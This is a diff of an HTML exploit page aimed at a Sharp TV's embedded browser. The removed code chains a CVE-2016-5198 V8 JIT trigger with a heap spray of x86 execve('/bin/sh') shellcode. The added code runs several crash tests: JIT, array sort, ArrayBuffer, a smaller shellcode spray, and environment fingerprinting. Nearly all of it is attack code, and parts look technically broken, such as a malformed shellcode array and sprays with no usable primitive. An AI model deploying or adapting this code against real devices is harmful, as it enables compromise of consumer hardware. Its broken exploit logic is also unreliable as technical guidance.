@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Sharp TV V8 Exploit (CVE-2016-5198)</title>
+    <title>Sharp TV Exploit v2 (Lightweight)</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #output { white-space: pre-wrap; }
@@ -12,66 +12,100 @@
     </style>
 </head>
 <body>
-    <h1>Sharp TV Exploit — CVE-2016-5198 (V8 JIT RCE)</h1>
-    <p class="info">Waiting for exploit to trigger...</p>
+    <h1>Sharp TV Exploit v2 — Lightweight</h1>
     <div id="output"></div>
     <script>
-        // CVE-2016-5198: V8 JIT incorrect optimization assumptions
-        // Leads to use-after-free -> arbitrary r/w -> code execution
-        // Target: Chrome < 54 (your TV has ~2015 fork)
-
         function log(msg, cls) {
             var el = document.getElementById('output');
             el.innerHTML += '<span class="' + (cls || '') + '">' + msg + '</span>\n';
         }
 
-        // Step 1: Trigger the JIT bug
-        function trigger_bug() {
-            var n = new Set();
-            function Ctor() { n = new Set(); }
-            function Check() { n.xyz = 0x826852f4; parseInt(); }
-            for (var i = 0; i < 2000; ++i) { Ctor(); }
-            for (var i = 0; i < 2000; ++i) { Check(); }
-            Ctor();
-            Check();
-            log("Bug triggered. If TV crashed or showed error, exploit worked.", "ok");
-            return true;
-        }
-
-        // Step 2: Heap spray for reliable code execution
-        function heap_spray() {
-            log("Spraying heap...", "info");
-            var shellcode = [
-                0x31c0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68,
-                0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x53,
-                0xb0, 0x0b, 0xcd, 0x80
-            ];
-            var sc_str = "";
-            for (var i = 0; i < shellcode.length; i++) {
-                sc_str += String.fromCharCode(shellcode[i]);
-            }
-            var payload = sc_str + "A".repeat(65536 - sc_str.length);
-            var spray = [];
-            for (var i = 0; i < 1000; i++) {
-                spray.push(payload);
-            }
-            log("Heap sprayed. Attempting execution...", "info");
-            return spray;
-        }
-
-        // Step 3: Try to execute
-        function attempt_execution() {
-            heap_spray();
+        // Test 1: Simple crash via CVE-2016-5198 (no heap spray)
+        function test_crash() {
+            log("Test 1: Simple V8 JIT crash (CVE-2016-5198)", "info");
             try {
-                trigger_bug();
-                log("Exploit completed! Check TV for shell or crash.", "ok");
+                var n = new Set();
+                function Ctor() { n = new Set(); }
+                function Check() { n.xyz = 0x826852f4; parseInt(); }
+                for (var i = 0; i < 100; ++i) { Ctor(); }
+                for (var i = 0; i < 100; ++i) { Check(); }
+                log("Test 1: No crash detected", "err");
+                return false;
             } catch (e) {
-                log("Error: " + e, "err");
+                log("Test 1: Exception: " + e, "ok");
+                return true;
             }
         }
 
-        log("Starting exploit chain...", "info");
-        setTimeout(attempt_execution, 1000);
+        // Test 2: Array.prototype.sort exploit (CVE-2026-85046 style, works on old V8)
+        function test_sort_exploit() {
+            log("Test 2: Array sort type confusion", "info");
+            try {
+                var arr = [1, 2, 3];
+                arr.sort(function(a, b) {
+                    arr[0] = "string";
+                    arr[1] = 42;
+                    return a - b;
+                });
+                log("Test 2: No crash", "err");
+                return false;
+            } catch (e) {
+                log("Test 2: Exception: " + e, "ok");
+                return true;
+            }
+        }
+
+        // Test 3: ArrayBuffer overflow
+        function test_arraybuffer() {
+            log("Test 3: ArrayBuffer overflow", "info");
+            try {
+                var buf = new ArrayBuffer(8);
+                var view = new Uint8Array(buf, 0, 100);
+                view[0] = 1;
+                log("Test 3: No crash", "err");
+                return false;
+            } catch (e) {
+                log("Test 3: Exception: " + e, "ok");
+                return true;
+            }
+        }
+
+        // Test 4: Tiny heap spray + crash
+        function test_tiny_spray() {
+            log("Test 4: Tiny heap spray + crash", "info");
+            try {
+                var shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\xb0\x0b\xcd\x80";
+                var payload = shellcode + "A".repeat(1024);
+                var spray = [];
+                for (var i = 0; i < 100; i++) {
+                    spray.push(payload);
+                }
+                // Trigger crash
+                test_crash();
+                log("Test 4: Done", "info");
+                return false;
+            } catch (e) {
+                log("Test 4: Exception: " + e, "ok");
+                return true;
+            }
+        }
+
+        // Test 5: Check if we can detect TV environment
+        function test_environment() {
+            log("Test 5: Environment detection", "info");
+            log("  User-Agent: " + navigator.userAgent, "info");
+            log("  Platform: " + navigator.platform, "info");
+            log("  Language: " + navigator.language, "info");
+            log("  Memory: " + (performance.memory ? "Yes" : "No"), "info");
+            return false;
+        }
+
+        log("Starting lightweight exploit tests...", "info");
+        test_environment();
+        setTimeout(test_crash, 500);
+        setTimeout(test_sort_exploit, 1500);
+        setTimeout(test_arraybuffer, 2500);
+        setTimeout(test_tiny_spray, 3500);
     </script>
 </body>
 </html>
